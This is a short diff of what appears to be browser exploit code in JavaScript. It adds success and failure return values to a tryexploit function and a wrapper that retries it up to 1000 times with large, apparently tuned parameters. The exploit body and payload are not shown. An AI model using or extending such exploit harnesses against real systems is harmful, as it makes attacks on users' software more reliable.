@@ -68,16 +68,26 @@ function tryexploit(a_c, p_c){
 			}
 			
 			alert("after loop");
+			return 1;
 		}
 	} 
 	catch(err){
 		//alert("Expection:" + err);
 		return 0;
 	}
+	return 0
 }
 
+function forcetryexploit(ac, pc){
+	for(i=0; i< 1000; i++){
+		if(tryexploit(ac, pc) == 1){
+			alert("Finally worked!");
+			break;
+		}
+	}
+}
 
-tryexploit(930000, 50);
+forcetryexploit(930000, 50);
 //ac = 4250000;
 //pc = 100;
 //ac = 71000;
